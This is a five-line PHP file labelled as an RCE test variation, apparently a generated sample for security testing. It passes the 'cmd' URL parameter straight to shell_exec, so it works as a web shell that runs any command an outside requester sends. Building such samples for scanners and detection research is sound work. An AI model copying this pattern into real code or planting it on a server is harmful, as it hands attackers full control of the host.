<?php
// RCE test variation #163
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>